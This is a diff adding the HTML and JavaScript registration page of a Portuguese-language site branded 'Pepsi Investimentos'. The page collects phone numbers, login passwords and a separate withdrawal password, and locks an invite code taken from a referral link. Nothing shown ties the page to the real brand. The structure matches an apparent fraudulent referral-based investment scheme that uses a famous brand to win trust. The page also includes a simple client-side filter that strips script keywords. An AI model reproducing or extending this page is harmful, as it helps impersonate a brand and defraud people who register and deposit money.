@@ -1,0 +1,518 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pepsi - Registro</title>
+    
+    <meta name="description" content="Pepsi Investimentos Comece agora invista no futuro!">
+    <meta name="keywords" content="">
+    
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="">
+    <meta property="og:title" content="Pepsi">
+    <meta property="og:description" content="Pepsi Investimentos Comece agora invista no futuro!">
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    
+    <style>
+        :root {
+            --primary: #2563eb;
+            --primary-light: #3b82f6;
+            --primary-dark: #1d4ed8;
+            --background: #ffffff;
+            --surface: #f8fafc;
+            --text: #0f172a;
+            --text-secondary: #64748b;
+            --border: #e2e8f0;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', system-ui, -apple-system, sans-serif;
+        }
+
+        body {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: var(--background);
+            padding: 20px;
+            position: relative;
+            background-image: url('https://images.unsplash.com/photo-1614850523459-c2f4c699c52e?auto=format&fit=crop&w=1920&q=80');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.95);
+            z-index: 1;
+        }
+
+        @keyframes float {
+            0%, 100% {
+                transform: translateY(0);
+            }
+            50% {
+                transform: translateY(-20px);
+            }
+        }
+
+        .register-container {
+            width: 100%;
+            max-width: 480px;
+            position: relative;
+            z-index: 2;
+        }
+
+        .register-card {
+            background: white;
+            border-radius: 24px;
+            padding: 40px;
+            backdrop-filter: blur(10px);
+            border: 1px solid var(--border);
+            box-shadow: 0 25px 50px -12px rgba(37, 99, 235, 0.25);
+        }
+
+        .register-header {
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+            border-radius: 16px;
+            margin-bottom: 2rem;
+        }
+
+        .register-header img {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(37, 99, 235, 0.1);
+        }
+
+        .register-header p {
+            color: var(--text-secondary);
+            margin-top: 1rem;
+        }
+
+        .input-group {
+            margin-bottom: 1.5rem;
+            position: relative;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 15px 45px;
+            background: white;
+            border: 1px solid var(--primary-light);
+            border-radius: 12px;
+            color: var(--text);
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+
+        .input-group input:focus {
+            outline: none;
+            border-color: var(--primary-light);
+            box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.1);
+        }
+
+        .input-group i {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--primary-light);
+            font-size: 18px;
+        }
+
+        .validation-message {
+            margin-top: 0.5rem;
+            color: #ef4444;
+            font-size: 0.875rem;
+            display: none;
+        }
+
+        .input-group.error input {
+            border-color: #ef4444;
+        }
+
+        .input-group.error .validation-message {
+            display: block;
+        }
+
+        .register-button {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+            border: none;
+            border-radius: 12px;
+            color: white;
+            font-size: 16px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            cursor: pointer;
+            transition: all 0.3s;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .register-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(37, 99, 235, 0.3);
+        }
+
+        .register-button::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(
+                45deg,
+                transparent,
+                rgba(255, 255, 255, 0.1),
+                transparent
+            );
+            transform: rotate(45deg);
+            transition: 0.5s;
+        }
+
+        .register-button:hover::after {
+            transform: translateX(100%) rotate(45deg);
+        }
+
+        .login-link {
+            text-align: center;
+            margin-top: 1.5rem;
+            color: var(--text);
+        }
+
+        .login-link a {
+            color: var(--primary-light);
+            text-decoration: none;
+            font-weight: 600;
+            transition: all 0.3s;
+        }
+
+        .login-link a:hover {
+            color: var(--primary-dark);
+            text-decoration: underline;
+        }
+
+        @media (max-width: 480px) {
+            .register-card {
+                padding: 30px 20px;
+            }
+
+            .register-header img {
+                height: 150px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="register-container">
+        <div class="register-card">
+            <div class="register-header">
+                <img src="https://scontent.fcgh27-1.fna.fbcdn.net/v/t39.30808-6/361089957_581441730824961_3030594987995381919_n.jpg?_nc_cat=102&ccb=1-7&_nc_sid=6ee11a&_nc_ohc=lVOCzBAgb7sQ7kNvwHFjd8y&_nc_oc=AdknH0hiaBXtXhbQZtid6VS_f8skRsiS1W9_CuQUy86ult26yF26CHwApEHpW-TTdr4&_nc_zt=23&_nc_ht=scontent.fcgh27-1.fna&_nc_gid=hZIzpdwVz4bv2E6Ni2pxPQ&oh=00_AfGIhpdp9ONh9qLa9J5_yaxWmULWA6LZML5g5O6nH93Npw&oe=681B895E" 
+                     alt="Pepsi Banner">
+                <p id="typing-text"></p>
+            </div>
+
+            <form id="registrationForm" method="POST" action="processa_registro.php">
+                <div class="input-group">
+                    <i class="fas fa-phone"></i>
+                    <input type="tel" 
+                           name="telefone" 
+                           id="telefone"
+                           placeholder="Número de Telefone"
+                           required>
+                    <div class="validation-message">Formato: +55 XX XXXXX-XXXX</div>
+                </div>
+
+                <div class="input-group">
+                    <i class="fas fa-lock"></i>
+                    <input type="password" 
+                           name="senha" 
+                           id="senha"
+                           placeholder="Senha de Login"
+                           required>
+                    <div class="validation-message">Mínimo 6 caracteres</div>
+                </div>
+
+                <div class="input-group">
+                    <i class="fas fa-lock"></i>
+                    <input type="password" 
+                           name="confirma_senha" 
+                           id="confirma_senha"
+                           placeholder="Confirme sua Senha"
+                           required>
+                    <div class="validation-message">As senhas não coincidem</div>
+                </div>
+
+                <div class="input-group">
+                    <i class="fas fa-key"></i>
+                    <input type="password" 
+                           name="senha_saque" 
+                           id="senha_saque"
+                           placeholder="Senha para Saques"
+                           required>
+                    <div class="validation-message">Mínimo 6 caracteres</div>
+                </div>
+
+                <div class="input-group">
+                    <i class="fas fa-ticket"></i>
+                    <input type="text" 
+                           name="codigo_convite" 
+                           id="codigo_convite"
+                           value=""
+                           placeholder="Código de convite (opcional)">
+                </div>
+
+                <button type="submit" class="register-button">
+                    Criar Conta
+                    <i class="fas fa-check"></i>
+                </button>
+            </form>
+
+            <div class="login-link">
+                <p>Já tem uma conta? <a href="index.html">Fazer Login</a></p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Função para sanitizar input
+        function sanitizeClientInput(input) {
+            return input
+                .replace(/[<>]/g, '')
+                .replace(/javascript:/gi, '')
+                .replace(/on\w+=/gi, '')
+                .replace(/data:/gi, '')
+                .replace(/&#/g, '')
+                .trim();
+        }
+
+        const telefoneInput = document.getElementById('telefone');
+        if (telefoneInput) {
+            telefoneInput.addEventListener('input', function() {
+                let value = sanitizeClientInput(this.value).replace(/\D/g, '');
+                
+                if (value.length > 13) {
+                    value = value.slice(0, 13);
+                }
+                
+                if (!value.startsWith('55')) {
+                    value = '55' + value;
+                }
+                
+                if (value.length >= 13) {
+                    this.value = `+${value.slice(0, 2)} ${value.slice(2, 4)} ${value.slice(4, 9)}-${value.slice(9)}`;
+                } else if (value.length > 4) {
+                    this.value = `+${value.slice(0, 2)} ${value.slice(2, 4)} ${value.slice(4)}`;
+                } else if (value.length > 2) {
+                    this.value = `+${value.slice(0, 2)} ${value.slice(2)}`;
+                } else {
+                    this.value = value ? '+' + value : '';
+                }
+            });
+        }
+
+        const senhaInput = document.getElementById('senha');
+        const confirmaSenhaInput = document.getElementById('confirma_senha');
+        
+        if (senhaInput && confirmaSenhaInput) {
+            function validatePasswords() {
+                const senha = senhaInput.value;
+                const confirmacao = confirmaSenhaInput.value;
+                
+                senhaInput.parentElement.classList.toggle('error', senha.length < 6);
+                confirmaSenhaInput.parentElement.classList.toggle('error', 
+                    confirmacao.length > 0 && senha !== confirmacao);
+            }
+
+            senhaInput.addEventListener('input', validatePasswords);
+            confirmaSenhaInput.addEventListener('input', validatePasswords);
+        }
+
+        document.getElementById('registrationForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const telefone = document.getElementById('telefone').value.replace(/\D/g, ''); 
+            const senha = document.getElementById('senha').value;
+            const senhaSaque = document.getElementById('senha_saque').value;
+            
+            if (telefone.length !== 13) {
+                Swal.fire({
+                    icon: 'error',
+                    title: 'Telefone Inválido',
+                    text: 'Digite um número de telefone válido',
+                    background: '#ffffff',
+                    color: '#0f172a',
+                    confirmButtonColor: '#2563eb'
+                });
+                return;
+            }
+
+            const confirmaSenha = document.getElementById('confirma_senha').value;
+            if (senha !== confirmaSenha) {
+                Swal.fire({
+                    icon: 'error',
+                    title: 'Senhas Diferentes',
+                    text: 'As senhas de login não coincidem',
+                    background: '#ffffff',
+                    color: '#0f172a',
+                    confirmButtonColor: '#2563eb'
+                });
+                return;
+            }
+            if (senha.length < 6) {
+                Swal.fire({
+                    icon: 'error',
+                    title: 'Senha Fraca',
+                    text: 'A senha deve ter pelo menos 6 caracteres',
+                    background: '#ffffff',
+                    color: '#0f172a',
+                    confirmButtonColor: '#2563eb'
+                });
+                return;
+            }
+
+            if (senhaSaque.length < 6) {
+                Swal.fire({
+                    icon: 'error',
+                    title: 'Senha de Saque Fraca',
+                    text: 'A senha para saques deve ter pelo menos 6 caracteres',
+                    background: '#ffffff',
+                    color: '#0f172a',
+                    confirmButtonColor: '#2563eb'
+                });
+                return;
+            }
+
+            const formData = new FormData(this);
+            
+            // Sanitize form data before sending
+            const sanitizedFormData = new FormData();
+            for (let [key, value] of formData.entries()) {
+                // Sanitize the value
+                let sanitizedValue = value.toString()
+                    .replace(/[<>]/g, '') // Remove < >
+                    .replace(/javascript:/gi, '') // Remove javascript:
+                    .replace(/on\w+=/gi, '') // Remove event handlers
+                    .replace(/data:/gi, '') // Remove data: URLs
+                    .replace(/&#/g, '') // Remove HTML entities
+                    .trim();
+                sanitizedFormData.append(key, sanitizedValue);
+            }
+            
+            fetch('processa_registro.php', {
+                method: 'POST',
+                body: sanitizedFormData,
+                headers: {
+                    'Accept': 'application/json'
+                }
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Erro na requisição');
+                }
+                return response.json();
+            })
+            .then(data => {
+                if (data.success) {
+                    if (data.showReward) {
+                        Swal.fire({
+                            icon: 'success',
+                            title: 'Registro Concluído!',
+                            html: `
+                                <div style="text-align: center;">
+                                    <div style="
+                                        background: linear-gradient(135deg, #2563eb, #1d4ed8);
+                                        padding: 30px;
+                                        border-radius: 20px;
+                                        margin: 20px 0;
+                                        color: white;
+                                        box-shadow: 0 10px 30px rgba(37, 99, 235, 0.3);
+                                        animation: pulse 2s infinite;
+                                    ">
+                                        <div style="font-size: 48px; margin-bottom: 20px;">
+                                            🎉
+                                        </div>
+                                        <h3 style="margin-bottom: 10px;">
+                                            Parabéns!
+                                        </h3>
+                                        <p>
+                                            Seu registro foi concluído com sucesso!
+                                        </p>
+                                    </div>
+                                </div>
+                            `,
+                            background: '#ffffff',
+                            confirmButtonText: 'Fazer Login',
+                            confirmButtonColor: '#2563eb',
+                            allowOutsideClick: false,
+                            showClass: {
+                                popup: 'animate__animated animate__fadeInDown'
+                            },
+                            hideClass: {
+                                popup: 'animate__animated animate__fadeOutUp'
+                            }
+                        }).then((result) => {
+                            if (result.isConfirmed) {
+                                window.location.href = '../';
+                            }
+                        });
+                    } else {
+                        window.location.href = 'index.html?step=' + (1 + 1);
+                    }
+                } else {
+                    Swal.fire({
+                        icon: 'error',
+                        title: 'Erro!',
+                        text: data.message || 'Ocorreu um erro ao processar sua solicitação.',
+                        background: '#ffffff',
+                        color: '#0f172a',
+                        confirmButtonColor: '#2563eb'
+                    });
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                Swal.fire({
+                    icon: 'error',
+                    title: 'Erro!',
+                    text: 'Ocorreu um erro ao processar sua solicitação. Por favor, tente novamente.',
+                    background: '#ffffff',
+                    color: '#0f172a',
+                    confirmButtonColor: '#2563eb'
+                });
+            });
+        });
+
+        document.addEventListener('DOMContentLoaded', function() {
+            const codigoConviteInput = document.getElementById('codigo_convite');
+            const urlParams = new URLSearchParams(window.location.search);
+            const ref = urlParams.get('ref');
+            
+            if (ref && codigoConviteInput) {
+                codigoConviteInput.value = ref;
+                codigoConviteInput.readOnly = true;
+            }
+        });
+    </script>
+</body>
+</html>
